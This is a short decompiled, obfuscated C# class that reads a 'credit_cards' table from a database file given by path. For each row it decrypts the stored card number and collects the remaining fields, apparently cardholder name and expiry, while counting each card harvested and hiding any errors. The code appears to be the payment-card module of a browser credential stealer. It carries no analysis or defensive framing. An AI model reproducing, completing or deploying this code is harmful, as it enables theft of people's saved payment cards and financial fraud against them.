using System.Collections.Generic;
using ns13;

namespace ns12;

internal sealed class Class50
{
	public static List<Struct3> smethod_0(string string_0)
	{
		try
		{
			List<Struct3> list = new List<Struct3>();
			Class58 @class = Class59.smethod_0(string_0, "credit_cards");
			if (@class == null)
			{
				return list;
			}
			for (int i = 0; i < @class.method_1(); i++)
			{
				Struct3 item = default(Struct3);
				item.String_0 = Class47.smethod_2(Class47.smethod_4(string_0, @class.method_0(i, 4)));
				item.String_1 = Class47.smethod_2(@class.method_0(i, 3));
				item.String_2 = Class47.smethod_2(@class.method_0(i, 2));
				item.String_3 = Class47.smethod_2(@class.method_0(i, 1));
				Class55.int_1++;
				list.Add(item);
			}
			return list;
		}
		catch
		{
			return new List<Struct3>();
		}
	}
}
